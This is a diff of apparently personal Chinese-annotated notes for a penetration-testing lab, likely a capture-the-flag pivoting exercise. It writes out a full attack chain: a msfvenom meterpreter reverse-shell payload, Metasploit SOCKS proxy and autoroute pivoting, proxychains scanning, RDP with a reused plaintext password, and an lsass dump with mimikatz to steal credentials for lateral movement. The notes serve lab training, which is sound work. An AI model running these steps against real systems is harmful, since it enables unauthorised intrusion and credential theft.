@@ -339,18 +339,38 @@ LAB
 chmod 600 id_rsa
 ssh -i id_rsa webadmin@10.129.88.197                                                                                      用私钥 SSH 到跳板
 ip a                                                                                                                      检查网卡，找到内网网段 172.16.5.15/16
-for i in {1..254};do (ping -c 1 172.16.5.$i | grep "bytes from" &); done                                                  bash 扫描内网
+for i in {1..254};do (ping -c 1 172.16.5.$i | grep "bytes from" &); done                                                  用 bash 扫描 ping 内网
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=PWNIP LPORT=PWNPO -f elf -o 99c0b43c4bec2bdc280741d8f3e40338.elf      生成 playload
 scp -i id_rsa 99c0b43c4bec2bdc280741d8f3e40338.elf webadmin@STMIP:~/                                                      传输到跳板
 msfconsole -q
-use exploit/multi/handler
-set LHOST 0.0.0.0
-set LPORT PWNPO
-set PAYLOAD linux/x64/meterpreter/reverse_tcp
-run
-
-
-
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 0.0.0.0
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 9001
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD linux/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run                                                                      用 msf 启动监听
+ssh -i id_rsa webadmin@@10.129.88.197                                                                                     用私钥 SSH 到跳板，如还没连接
+webadmin@inlanefreight:~$ chmod +x 99c0b43c4bec2bdc280741d8f3e40338.elf                                                   加执行权限
+webadmin@inlanefreight:~$ ./99c0b43c4bec2bdc280741d8f3e40338.elf                                                          运行 playload
+(Meterpreter 1)(/home/webadmin) > bg                                                                                      后台反向 shell
+[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use auxiliary/server/socks_proxy
+[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set SRVPORT 9050
+[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set SRVHOST 0.0.0.0
+[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set VERSION 4a
+[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> run                                                                用 msf 设置 sock
+[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> sessions -i 1                                                      回到反向 shell
+(Meterpreter 1)(/home/webadmin) > run autoroute -s 172.16.5.0/16                                                           用 msf 设置路由
+proxychains nmap 172.16.5.35 -Pn -sT                                                                                       扫描内网，发现 rdp 端口开放
+proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'                                                       用之前的密码 rdp 到目标
+PS C:\Users\mlefay> type C:\Flag.txt                                                                                       夺旗
+wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip                            下载 mimikatz
+unzip mimikatz_trunk.zip                                                                                                   解压
+用 GUI 复贴到目标
+管理员打开 Task Manager 找到 Local Security Authority Process, students need to right-click 并且 select Create dump file     拿到 lsass.DMP
+管理员启动 mimikatz
+mimikatz # sekurlsa::LogonPasswords                                                                                        拿到用户 vfrank 的密码和哈希
+PS C:\Users\mlefay> 1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}                 在目标 ping 内网，找到 172.16.6.25
+在目标打开 Remote Desk Connection，用 vfrank 连接 172.16.6.25
+172.16.6.25:> type C:\Flag.txt                                                                                             在目标2 夺旗
+可以接着搜刮目标2
 
 
 
